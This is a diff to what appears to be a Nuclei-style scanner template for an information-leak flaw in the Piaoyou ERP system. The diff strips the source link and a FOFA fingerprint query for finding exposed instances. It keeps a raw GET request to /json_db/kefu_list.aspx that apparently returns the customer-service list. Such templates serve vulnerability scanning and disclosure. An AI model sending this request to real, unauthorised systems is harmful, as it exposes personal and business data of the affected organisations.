@@ -3,12 +3,8 @@ info:
   name: 票友ERP系统kefu_list存在信息泄露
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uwu8g69nn3qdi9lb'
+  description: ''
   tags: info-leak,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: uwu8g69nn3qdi9lb
-    fofa: (body="css/sexybuttons.css" && body="Ajax/confirm.ashx") || title="票友ERP"||body="tickets/intCity.css"
 http:
 - raw:
   - 'GET /json_db/kefu_list.aspx?stype=0&_search=false&nd=1751246532981&rows=25&page=1&sidx=id&sord=asc HTTP/1.1
